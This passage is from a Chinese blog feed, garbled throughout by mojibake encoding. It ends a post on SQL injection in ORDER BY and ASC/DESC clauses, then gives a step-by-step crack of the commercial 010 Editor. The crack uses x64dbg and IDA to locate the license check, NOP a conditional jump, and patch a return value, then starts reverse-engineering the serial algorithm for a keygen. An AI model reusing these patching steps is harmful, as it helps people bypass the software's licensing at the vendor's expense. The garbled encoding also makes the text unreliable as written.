å…¥<code>ASC/DESC</code>æ—¶ï¼Œåç«¯å¤§æ¦‚ç‡ä½¿ç”¨çš„æ˜¯æ‹¼æ¥ï¼Œç”¨äº†æ‹¼æ¥å°±é€ æˆäº†SQLæ³¨å…¥çš„å¯èƒ½</p><h4 id="æœ€åçš„æœ€å"><a href="#æœ€åçš„æœ€å" class="headerlink" title="æœ€åçš„æœ€å"></a>æœ€åçš„æœ€å</h4><p>ç›®å‰æ‰€äº†è§£åˆ°çš„åŸºæœ¬ä¸Šå°±è¿™äº›ï¼Œçœ‹ç½‘ä¸Šè¯´è¿˜æœ‰â€IN è¯­å¥ä¹‹åâ€ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•ä¹‹åå‘ç°<code>IN</code>è¯­å¥ä¹‹åèƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨é¢„å¤„ç†ï¼Œ<code>IN</code>è¯­å¥ä¹‹åè‹¥å­˜åœ¨SQLæ³¨å…¥çš„è¯å¤§æ¦‚ç‡å°±æ˜¯æ‹¼æ¥ï¼Œè€Œæ‹¼æ¥çš„è¯å°±è·Ÿæ™®é€šçš„æ³¨å…¥åŒºåˆ«ä¸å¤§äº†ï¼Œæ‰€ä»¥å°±æ²¡æœ‰å†™å…³äº<code>IN</code>è¯­å¥ä¹‹åçš„ã€‚æ–‡ç« é‡Œé¢ä¼°è®¡æœ‰ä¸€äº›é”™è¯¯çš„åœ°æ–¹ï¼Œä»¥åŠä¸€äº›æ²¡æœ‰è¯´æ¸…çš„åœ°æ–¹ï¼Œåé¢ç¿»çœ‹çš„æ—¶å€™å¦‚æœå‘ç°äº†å°±å†æ›´æ–°ï¼Œæ¯•ç«Ÿç°åœ¨èœçš„ç¦»è°±ï¼Œå†™é”™äº†ä¹Ÿä¸çŸ¥é“é”™äº†ï¼›è¿˜æœ‰å°±æ˜¯è‚¯å®šæœ‰ä¸€äº›ä¸èƒ½ä½¿ç”¨é¢„ç¼–è¯‘æˆ–é¢„ç¼–è¯‘å¯èƒ½å­˜åœ¨çš„é—®é¢˜æ²¡æœ‰å†™åˆ°ï¼Œåé¢å¦‚æœå­¦ä¹ åˆ°æˆ–è€…é‡åˆ°çš„æ—¶å€™è¦è¡¥å……è¿›æ¥çš„ã€‚æœ€åçš„æœ€åï¼Œè¯¥å»æƒ³åŠæ³•æ¡ç‚¹åƒåœ¾åƒæ™šé¥­äº†</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/14.png"></p><h4 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h4><p><a href="https://www.cnblogs.com/Cyangsec/p/13067369.html">https://www.cnblogs.com/Cyangsec/p/13067369.html</a></p><p><a href="https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11f">https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11f</a></p><p><a href="https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be">https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be</a></p><p><a href="https://cloud.tencent.com/developer/news/378220">https://cloud.tencent.com/developer/news/378220</a></p><p><a href="https://xz.aliyun.com/t/7132#toc-11">https://xz.aliyun.com/t/7132#toc-11</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ä¸ºäº†å¤šæ¡ç‚¹åƒåœ¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>010 Editor ç ´è§£</title>
    <link href="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="010-Editorç ´è§£"><a href="#010-Editorç ´è§£" class="headerlink" title="010 Editorç ´è§£"></a>010 Editorç ´è§£</h3><p>è¿™ç¯‡æ–‡ç« æ¥è‡ªäºè¿«äºæ— å¥ˆçš„æŠ€æœ¯åˆ†äº«ï¼Œæ²¡å•¥ä¼šçš„ï¼Œåˆä¸èƒ½ä¸å‰é¢é‡å¤ï¼Œäºæ˜¯ä¹æ˜¯èƒ½çœ‹çœ‹ç½‘ä¸Šçš„æ•™ç¨‹è‡ªå·±æ¥ä¸€éäº†ã€‚</p><p>å¯ä»¥è¯´æ˜¯æŠ„çš„ï¼Œä½†ä¹Ÿæœ‰è‡ªå·±çš„åˆ†æä¸å­¦ä¹ ï¼Œæ•…è®°å½•ä¸‹æ¥ã€‚</p><h4 id="1-å‰æœŸå‡†å¤‡"><a href="#1-å‰æœŸå‡†å¤‡" class="headerlink" title="1. å‰æœŸå‡†å¤‡"></a>1. å‰æœŸå‡†å¤‡</h4><h5 id="010Eitor-v9-0-2-64-bit"><a href="#010Eitor-v9-0-2-64-bit" class="headerlink" title="010Eitor v9.0.2 64-bit"></a>010Eitor v9.0.2 64-bit</h5><h5 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h5><ul><li>exeinfope (æŸ¥å£³)</li><li>Xdbg (åŠ¨æ€è°ƒè¯•)</li><li>IDA (é™æ€åˆ†æ)</li><li>PyCharm (ç¼–å†™æ³¨å†Œæœº)</li></ul><h4 id="2-æš´åŠ›ç ´è§£"><a href="#2-æš´åŠ›ç ´è§£" class="headerlink" title="2. æš´åŠ›ç ´è§£"></a>2. æš´åŠ›ç ´è§£</h4><p>ä¸€èˆ¬çš„ç ´è§£ï¼Œå°±æ˜¯é€šè¿‡æ›´æ”¹ä¸€äº›å…³é”®è·³è½¬ï¼Œå°†æœ¬æ¥æŒ‡å‘é”™è¯¯çš„ä½ç½®è¿›è¡Œæ›´æ”¹ï¼Œä½¿å…¶æŒ‡å‘æ­£ç¡®çš„ä½ç½®ï¼Œä»è€Œè·³è¿‡éªŒè¯ï¼Œä½¿è½¯ä»¶åœ¨è¿›è¡ŒéªŒè¯æ—¶ä¼šç›´æ¥èµ°å‘æˆåŠŸï¼›æˆ–è€…è¯´ï¼Œè½¯ä»¶çš„æ³¨å†Œç æ˜¯æ ¹æ®ç”¨æˆ·åè¿›è¡Œä¸€ä¸ªè®¡ç®—ï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ªæ³¨å†Œç ï¼Œè¿™ç§å¯ä»¥é€šè¿‡è¾“å…¥ç”¨æˆ·åï¼Œç„¶ååœ¨æœ€åè¿›è¡Œå¯¹æ¯”æ—¶è·å–å¾—åˆ°è¯¥ç”¨æˆ·åçš„æ³¨å†Œç ï¼Œè¿™æ ·åŒæ ·èƒ½å¤Ÿå®ç°ç ´è§£çš„æ•ˆæœã€‚</p><h5 id="1ï¼‰ç ´è§£æ€è·¯"><a href="#1ï¼‰ç ´è§£æ€è·¯" class="headerlink" title="1ï¼‰ç ´è§£æ€è·¯"></a>1ï¼‰ç ´è§£æ€è·¯</h5><ul><li>æŸ¥å£³ï¼Œæœ‰å£³è„±å£³ï¼Œæ— å£³è·³è¿‡</li><li>ç¡®å®šæ³¨å†Œç®—æ³•ä½ç½®</li><li>æ‰¾å¯»å…³é”®è·³è½¬ï¼Œå¹¶å°†å…¶æ›´æ”¹æŒ‡å‘æˆåŠŸä½ç½®</li><li>æ‰“åŒ…æ›´æ”¹åçš„æ–‡ä»¶</li></ul><h5 id="2ï¼‰ç ´è§£è¿‡ç¨‹"><a href="#2ï¼‰ç ´è§£è¿‡ç¨‹" class="headerlink" title="2ï¼‰ç ´è§£è¿‡ç¨‹"></a>2ï¼‰ç ´è§£è¿‡ç¨‹</h5><p>ä»<a href="https://www.sweetscape.com/download/previous/">010Edirorå®˜ç½‘</a>ä¸‹è½½v9.0.2ç‰ˆæœ¬ï¼Œç„¶åå®‰è£…ï¼Œè¿™é‡Œæœ¬æ¥æ˜¯æƒ³æ‰¾v9.0.1ç‰ˆæœ¬çš„(å› ä¸ºæ•™ç¨‹ä¸Šé¢æ˜¯v9.0.1)ï¼Œä½†è‹¦äºå®˜ç½‘æ²¡æœ‰æ‰¾åˆ°ï¼Œæ‰€ä»¥åªèƒ½ä¸‹v9.0.2çš„äº†ï¼Œä½†è¿™ä¸¤ä¸ªå®é™…ä¸Šæ²¡å•¥åŒºåˆ«ã€‚å®‰è£…å¥½ä¹‹åï¼Œå°†å®‰è£…å¥½ä¹‹åçš„å¯æ‰§è¡Œæ–‡ä»¶(å¯ä¸æ˜¯å®‰è£…åŒ…)æ‹–å…¥exeinfopeè¿›è¡ŒæŸ¥å£³</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/1.png"></p><p>å¯ä»¥çœ‹åˆ°ç¨‹åºæ— å£³ã€‚å¯ä»¥ç›´æ¥é™„åŠ åˆ°xdbgä¸­è¿›è¡Œåˆ†æ</p><p>ç”±äº010Editoråœ¨Check Licenseï¼Œå½“æ³¨å†Œç ä¸å¯¹æ—¶ï¼Œä¼šæç¤ºé”™è¯¯ä¿¡æ¯ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥é‡‡ç”¨å­—ç¬¦ä¸²è¿›è¡Œå®šä½</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/2.png"></p><p>ä½¿ç”¨xdbg Alt+Aå°†ç¨‹åºé™„åŠ è¿›æ¥</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/3.png"></p><p>å³é”®-æœç´¢-æ‰€æœ‰æ¨¡å—-å­—ç¬¦ä¸²ï¼Œç„¶åæœç´¢åˆšåˆšæŠ¥é”™é¡µé¢ä¸Šçš„å­—ç¬¦ä¸²</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/4.png"></p><p>åŒå‡»è¿›å…¥è¯¥å‡½æ•°ï¼Œä¸Šä¸‹ç¿»ç¿»èƒ½å¤Ÿå‘ç°è¯¥å‡½æ•°ä¸æ­¢æœ‰åˆšåˆšçš„é”™è¯¯ä¿¡æ¯ï¼Œè¿˜æœ‰â€Thank you for purchasing 010 Editor!â€</p><p>æ‰€ä»¥åŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šè¯¥å‡½æ•°å°±æ˜¯Check Licenseå¤„çš„å…³é”®å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°å¤´å¤„ä¸‹æ–­ç‚¹ï¼Œç„¶åç‚¹å‡»Check Licenseï¼Œèƒ½å¤Ÿå‘ç°EIPå·²ç»è·³è½¬è‡³è¯¥ä½ç½®ï¼š</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/5.png"></p><p>F8å•æ­¥èµ°ä¸€éè¯¥å‡½æ•°ï¼Œèƒ½å¤Ÿå‘ç°ï¼Œåœ¨é”™è¯¯çš„æ³¨å†Œç æƒ…å†µä¸‹ï¼Œèƒ½å¤Ÿå‘ç°ç¨‹åºæœ‰ä¸¤ä¸ªå…³é”®æ€§çš„è·³è½¬</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/6.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/7.png"></p><p>åœ¨ç¨‹åºæ­£å¸¸æ‰§è¡Œä¸‹ï¼Œåœ¨èµ°åˆ°0x13FAF7AC2ä½ç½®å¤„ï¼Œä¼šç›´æ¥è·³è½¬åˆ°0x13FAF7BB5å¤„ï¼Œæ­¤æ—¶ebxçš„å€¼åˆä¸ä¸º0xDBï¼Œæ‰€ä»¥ä¼šç»§ç»­è¿›è¡Œè·³è½¬ï¼Œå¹¶ç›´æ¥è·³è½¬åˆ°æ³¨å†Œç é”™è¯¯ä½ç½®ï¼Œæ‰€ä»¥åŸºæœ¬å¯ä»¥åˆ¤å®šè¿™ä¸¤ä¸ªè·³è½¬å°±æ˜¯å…³é”®æ€§çš„ã€‚æ­¤å¤„å‘ä¿¡å•Šâ€ Thank you for purchasing 010 Editor!â€è¿™ä¸ªå­—ç¬¦ä¸²åœ¨ç¬¬äºŒä¸ªè·³è½¬åé¢ï¼Œæ‰€ä»¥å¯ä»¥å°†0x13FAF7BBBå¤„çš„jneä½¿ç”¨nopè¿›è¡Œæ³¨é‡Šæ‰</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/8.png"></p><p>F8ç»§ç»­å•æ­¥æ‰§è¡Œï¼Œèƒ½å¤Ÿå‘ç°010Editorå·²ç»èµ°åˆ°æˆåŠŸçš„ä½ç½®</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/9.png"></p><p>æ­¤æ—¶åŸºæœ¬okï¼Œè®©ç¨‹åºè·‘èµ·æ¥ï¼Œå‘ç°æ˜¾ç¤ºæ³¨å†ŒæˆåŠŸã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/10.png"></p><p>å°†ä¿®æ”¹ä¹‹åçš„ç¨‹åºè¿›è¡Œè¿›è¡Œä¿å­˜ï¼Œctrl+Pï¼Œä¿®æ”¹è¡¥ä¸ï¼Œå…¨é€‰ä¹‹åç‚¹å‡»ä¿å­˜</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/11.png"></p><p>å°†ä¿å­˜çš„å¯æ‰§è¡Œæ–‡ä»¶æ”¾åˆ°010Editorçš„å®‰è£…ç›®å½•ä¸‹(å› ä¸ºç¨‹åºåœ¨æ‰§è¡Œçš„æ—¶å€™ä¼šè°ƒç”¨ä¸€äº›å…¶ä»–æ–‡ä»¶)ï¼Œç„¶åå³å¯å®ç°ç ´è§£</p><p>è¿™æ ·å­ç ´è§£çš„è¯ï¼Œæ˜¯å­˜åœ¨ä¸€ä¸ªé—®é¢˜çš„ï¼Œå°±æ˜¯åœ¨æ¯ä¸€æ¬¡æ‰“å¼€010Editorçš„æ—¶å€™ï¼Œéƒ½ä¼šè®©å…ˆè¿›è¡Œæ³¨å†Œç çš„æ ¡éªŒï¼Œç„¶åæ‰èƒ½è¿›å…¥è½¯ä»¶ï¼Œå…¶å®æ²¡ä»€ä¹ˆå½±å“ï¼Œä½†æ˜¯çœ‹èµ·æ¥æ€»å½’æ˜¯æœ‰ç‚¹ä¸å®Œç¾ï¼Œæ‰€ä»¥éœ€è¦æ‰¾è¿›è¡Œæ–°ä¸€è½®çš„å°è¯•ï¼Œæ‹ä¸€ä¸‹åˆšåˆšçš„æ€è·¯ï¼š</p><blockquote><p>æœ‰ä¸¤ä¸ªå…³é”®çš„è·³è½¬ï¼Œä¸€ä¸ªæ˜¯  cmp esi,E7  åˆ¤æ–­ESIæ˜¯å¦ä¸º0xE7ï¼Œä¸æ˜¯åˆ™è·³ï¼›å¦ä¸€ä¸ªæ˜¯ cmp ebx,DBï¼Œåˆ¤æ–­EBXæ˜¯å¦ä¸º0xDBï¼Œä¸æ˜¯åˆ™è·³è½¬ï¼Œåˆšåˆšå°†cmp ebx,DBåé¢çš„è·³è½¬nopæ‰ï¼Œä½¿å¾—ç ´è§£æˆåŠŸã€‚å› æ­¤å¯ä»¥å°è¯•æ§åˆ¶EBXçš„å€¼ï¼Œè®©EBX=0xDBï¼Œè¿™æ ·ç¨‹åºå¯èƒ½å°±èµ°ä¸åˆ°å¼¹å‡ºæ•ˆéªŒæ³¨å†Œç çš„é¡µé¢äº†ï¼Œå› ä¸ºåœ¨æ‰“å¼€ç¨‹åºæ—¶ï¼Œç¨‹åºå†…éƒ¨æ ¡éªŒå‘ç°å·²ç»æ³¨å†ŒæˆåŠŸï¼Œæ‰€ä»¥å°±ä¸ä¼šè·³åˆ°æ•ˆéªŒæ³¨å†Œç çš„é¡µé¢ä¸­äº†ï¼ˆçŒœæµ‹ï¼‰ã€‚</p></blockquote><p>OKï¼Œå›åˆ°ç¨‹åºï¼Œå¯»æ‰¾æ§åˆ¶EBXçš„ä½ç½®ï¼Œç”±äºç¨‹åºæ˜¯ç»è¿‡ä¸¤ä¸ªè·³è½¬ä¹‹åç›´æ¥è·³åˆ°éªŒè¯ç é”™è¯¯çš„ä½ç½®ï¼Œæ‰€ä»¥åº”è¯¥åœ¨ç¬¬ä¸€ä¸ªè·³è½¬å‰å¯»æ‰¾æ§åˆ¶ebxå€¼çš„ä½ç½®ã€‚è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒEAXå¸¸ç”¨ä½œå‡½æ•°è¿”å›å€¼çš„å­˜å‚¨ï¼Œç®€å•ç‚¹è¯´å°±æ˜¯ return 1æ—¶ï¼Œå‡½æ•°æ‰§è¡Œç»“æŸåï¼Œeax=1</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/12.png"></p><p>è¿™é‡Œè°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªç¡®å®šESIï¼Œå¦ä¸€ä¸ªç¡®å®šEBXï¼Œå°†ç¨‹åºèµ°åˆ°0x13FE97AC2ï¼Œç„¶åF7æ­¥å…¥ï¼Œå‘ç°è°ƒç”¨çš„010Editor.1402B4820å‡½æ•°ï¼Œè·Ÿè¿›ï¼Œå°†è¯¥å‡½æ•°èµ°ä¸€é</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/13.png"></p><p>å‘ç°è¯¥å‡½æ•°åœ¨0x1402B4861ä½ç½®å¤„å°†eaxçš„å€¼ä¸0xE7è¿›è¡Œæ¯”è¾ƒï¼Œåœ¨é”™è¯¯çš„éªŒè¯ç æƒ…å†µä¸‹ï¼Œæ­¤å¤„ä¼šç›´æ¥è·³èµ°</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/14.png"></p><p>è·³åˆ°0x1402B48DCå¤„ï¼Œæ­¤å¤„å¯¹eaxè¿›è¡Œä¸€ä¸ªèµ‹å€¼ï¼Œèµ‹å€¼ç»“æŸåç›´æ¥å‡½æ•°ç»“æŸäº†ã€‚ç„¶åå›åˆ°åˆšåˆšçš„é‚£ä¸ªå‡½æ•°ä¸­ï¼Œå¼€å§‹è¿›è¡Œå¯¹æ¯”è·³è½¬ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/15.png"></p><p>ç”±äºæˆ‘ä»¬éœ€è¦EBXçš„å€¼ä¸º0xDBï¼Œè€Œ<code>EBX=EAX</code>ï¼ŒEAXçš„å€¼åˆæ˜¯010Editor.1402B4820å‡½æ•°è¿”å›çš„ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨0x1402B48DCå¤„å°†åŸæœ¬çš„<code>mov eax,177</code>æ›´æ”¹ä¸º<code>mov eax,DB</code>ï¼Œè¿™æ ·å°±å¯ä»¥æ»¡è¶³<code>EBX=0xDB</code>ã€‚OKï¼Œé€‰ä¸­è¯¥è¡Œ-ç©ºæ ¼ï¼Œç„¶åå°†0x177æ›´æ”¹ä¸º0xDBï¼Œç„¶åç¡®å®š</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/16.png"></p><p>æ›´æ”¹å®Œä¹‹åè®©ç¨‹åºè·‘èµ·æ¥ï¼Œæ˜¾ç¤ºæˆåŠŸ</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/17.png"></p><p>å†å°†ä¿®æ”¹ä¹‹åç¨‹åºè¿›è¡Œæ‰“åŒ…ï¼Œä¿å­˜åˆ°010Editorçš„å®‰è£…ç›®å½•ä¸­ï¼Œå°è¯•æ‰“å¼€ï¼Œèƒ½å¤Ÿå‘ç°å·²ç»ä¸å†éœ€è¦Check Licenseäº†</p><h4 id="3-ç®—æ³•åˆ†æ"><a href="#3-ç®—æ³•åˆ†æ" class="headerlink" title="3.ç®—æ³•åˆ†æ"></a>3.ç®—æ³•åˆ†æ</h4><p>é€šè¿‡å‰é¢çš„ç ´è§£è¿‡ç¨‹ï¼ŒåŸºæœ¬å¯ä»¥åˆ¤å®šç¡®å®šESIå’ŒEBXå€¼çš„é‚£ä¸¤ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬æƒ³è¦æ‰¾çš„æ³¨å†Œç®—æ³•å‡½æ•°ï¼Œæ‰€ä»¥åé¢å°†ç€é‡åˆ†æè¿™ä¸¤ä¸ªå‡½æ•°çš„å†…å®¹ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/18.png"></p><p>é¦–å…ˆå¯¹010editor.13F0C3F99è¿›è¡Œåˆ†æï¼Œæ­¤å¤„è°ƒç”¨çš„æ˜¯010Editor.140AB3F20å‡½æ•°ï¼Œåˆæ­¥åˆ†æåï¼Œå¾—å‡ºè¯¥å‡½æ•°ï¼Œå…ˆå¯¹è¾“å…¥åšäº†ç©ºæ£€æŸ¥ï¼Œç„¶åè¯»å–nameå’Œpasswordï¼Œå°†passwordå˜ä¸º16è¿›åˆ¶å¹¶å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/19.png"></p><p>å­˜å‚¨ä¸º16è¿›åˆ¶ä¹‹åï¼ŒåŸæœ¬è¾“å…¥çš„20ä½æ³¨å†Œç ç°åœ¨å°±ç›¸å½“äºæ˜¯10ç»„æ•°æ®ï¼Œå°†å…¶çœ‹æˆä¸€ä¸ªæ•°ç»„k[10]ã€‚ç»§ç»­å¾€ä¸‹ï¼Œç¨‹åºè¯»å–äº†å‡ ç»„æ•°æ®å‡†å¤‡è¿›è¡Œè¿ç®—ã€‚ç„¶åå¯¹k[3]ä½ç½®çš„å€¼è¿›è¡Œäº†ä¸€ä¸ªä¸‰æ¬¡æ¯”è¾ƒã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/20.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/21.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/22.png"></p><p>æ‰€ä»¥å¯ä»¥çŒœæµ‹k[3]ä½ç½®å¤„å­˜æ”¾çš„æ˜¯ä¸€ä¸ªæ³¨å†Œç çš„ç‰ˆæœ¬ï¼Œåˆ†åˆ«å¯¹åº”0x9Cã€0xFCã€0xACè¿™ä¸‰ä¸ªç‰ˆæœ¬ï¼Œæ­¤å¤„é€‰ç”¨0x9Cè¿™ä¸ªç‰ˆæœ¬è¿›è¡Œåˆ†æï¼Œæœ‰ä¸€ä¸ªæœ‰æ„æ€çš„äº‹æƒ…æ˜¯ï¼Œå½“æŠŠk[3]ä½ç½®å¤„æ›´æ”¹ä¸º9Cæ—¶ï¼Œæ³¨å†Œç å°±å˜æˆäº†8ç»„ï¼ˆè®©ç¨‹åºå¤„äºè„±ç¦»çŠ¶æ€ï¼Œè¦ä¸ç„¶å¯èƒ½ä¼šæœ‰æ–­ç‚¹å½±å“ï¼‰</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/23.png"></p><p>è¿™é‡Œå°†æ³¨å†Œç è¾“å…¥ä¸º0123-459C-6789-ABCDï¼Œä¸ºæ–¹ä¾¿åé¢çš„åœ¨å†…å­˜ä¸­å¯»æ‰¾ï¼Œå°†ç¨‹åºè¿è¡Œï¼Œèµ°åˆ°010Editor.140AB3F20å‡½æ•°é‡Œé¢ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/24.png"></p><p>æ³¨æ„å›¾ä¸­ç®­å¤´æ‰€æŒ‡å‡½æ•°ï¼Œå½“ä»æ‰§è¡Œå®Œè¯¥å‡½æ•°åï¼Œæ³¨æ„çœ‹æ ˆç©ºé—´ï¼Œæ³¨å†Œç å·²ç»è¢«ä¿å­˜åˆ°æ ˆä¸­ï¼Œå¯ä»¥è½¬åˆ°å†…å­˜çª—å£ä¸­ç”¨äºåç»­æŸ¥çœ‹è¾“å…¥çš„æ³¨å†Œç æ˜¯å¦æœ‰å˜åŒ–ã€‚ç»§ç»­å¾€ä¸‹èµ°ï¼Œå¯¹äºä¸€äº›ä¸æ³¨å†Œç æ²¡æœ‰å…³ç³»çš„æ“ä½œå¯ä»¥é€‚å½“è¿›è¡Œå¿½ç•¥ï¼Œå› ä¸ºè®¤çœŸåˆ†æé‚£äº›å¯èƒ½æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œéœ€è¦å¯»æ‰¾å…³é”®ç‚¹è¿›è¡Œåˆ†æã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/25.png"></p><p>æœ‰ä¸ªè·³è½¬ï¼Œä½†æ˜¯è·Ÿè¿›çœ‹äº†ä¹‹åå‘ç°è·Ÿæ³¨å†Œç è²Œä¼¼æ²¡ä»€ä¹ˆå…³ç³»ï¼Œå¹¶ä¸”ç¨‹åºä¸ä¼šè·³èµ°ï¼Œä¼šç»§ç»­æ‰§è¡Œï¼Œæ‰€ä»¥å¿½ç•¥ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/26.png"></p><p>è¿™é‡Œå…ˆæ˜¯å°†k[6]ã€k[5]ã€k[2]ã€k[1]ã€k[3]çš„å€¼å–å‡ºå¹¶å­˜å…¥å¯„å­˜å™¨ä¸­ï¼Œk[3]ç”¨æˆ·ç¡®å®šæ³¨å†Œç çš„ç‰ˆæœ¬ï¼Œå…¶ä½™çš„è§£ç”¨äºä¸‹é¢çš„è®¡ç®—ï¼Œåœ¨ç¡®å®šäº†æ³¨å†Œç ç‰ˆæœ¬ä¹‹åï¼Œå°†k[0]å–å‡ºå­˜å…¥ecxä¸­ï¼Œåé¢å°±æ˜¯ä¸€ç³»åˆ—çš„æ“ä½œäº†ï¼Œèµ°åˆ°ç¬¬ä¸€ä¸ªcallä½ç½®ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨IDAè¿›è¡Œåˆ†æï¼Œçœ‹çš„æ›´æ¸…æ¥šä¸€äº›ã€‚</p><p>ä½¿ç”¨IDAæ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼Œè¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œxdbgæ˜¯åŠ¨æ€è°ƒè¯•ï¼ŒIDAæ˜¯é™æ€åˆ†æï¼Œæ‰€ä»¥å¯¼è‡´ç¨‹åºåœ¨ä»–ä»¬ä¸¤ä¸ªä¸­çš„åŸºå€å¯èƒ½æ˜¯ä¸ç›¸åŒçš„ï¼Œæ‰€ä»¥éœ€è¦æ›´è¯¥IDAçš„åŸºå€ï¼Œå…ˆåœ¨xdbgä¸­alt+EæŸ¥çœ‹ç¨‹åºåŸºå€</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/27.png"></p><p>å†åˆ°IDAä¸­ Edit-Segment-Rebase programï¼Œå°†åœ¨xdbgä¸­å¾—åˆ°çš„åŸºå€å¡«å…¥ç¡®å®šå°±å¯ä»¥äº†</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/28.png"></p><p>OKï¼Œå›åˆ°æ­£é¢˜ï¼ŒåŒå‡»ç¬¬ä¸€ä¸ªcallä½ç½®ï¼Œèƒ½å¤Ÿçœ‹åˆ°å‡½æ•°çœŸæ­£çš„ä½ç½®ä¸º010editor.140AB3200ï¼Œåœ¨IDAå‡½æ•°çª—å£ä¸­æœç´¢140AB3200ï¼Œç„¶åF5åç¼–è¯‘ï¼Œèƒ½å¤Ÿå‘ç°è¯¥å‡½æ•°å¾ˆç®€å•ï¼Œåªæ˜¯è¿›è¡Œäº†å¼‚æˆ–ã€åŠ çš„è¿ç®—ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯CXé€šå¸¸ç”¨æ¥ä¼ å‚ï¼Œæ‰€ä»¥a1=CXï¼Œæ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œå·²çŸ¥cl = k[0]^k[6]ï¼Œæ‰€ä»¥a1=cx=cl=k[0]^k[6]ã€‚è¿™ä¸ªå‡½æ•°ç®€å•ç‚¹è¯´å°±æ˜¯å¯¹k[0]ã€k[6]çš„ä¸€ä¸ªæ“ä½œ</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/29.png"></p><p>å›åˆ°xdbgï¼Œçœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªcallå’Œç¬¬äºŒä¸ªcallä¹‹é—´çš„å†…å®¹ï¼Œå°±æ˜¯å°†å‡½æ•°çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­ï¼Œåœ¨è½¬åˆ°åœ°å€çª—å£ï¼Œåé¢ä¼šç”¨åˆ°è¿™ä¸ªå€¼ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/30.png"></p><p>ç»§ç»­å‘ä¸‹åˆ†æï¼Œçœ‹ç¬¬äºŒä¸ªcallï¼ŒåŒå‡»æŸ¥çœ‹å‡½æ•°åœ°å€ä¸º010editor.140AB3170ï¼Œç„¶åç”¨IDAæ‰¾åˆ°ï¼ŒF5åç¼–è¯‘ï¼Œå·²çŸ¥cxä½œä¸ºå‡½æ•°ä¼ å‚ï¼Œè€Œ<code>ecx=ebx=(0x100*(k[1]^k[7])+(k[2]^k[5])</code>ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæŠŠk[1]ã€k[2]ã€k[5]ã€k[7]è®¡ç®—çš„ç»“æœå¸¦å…¥è¿™ä¸ªå‡½æ•°ã€‚</p><p><img 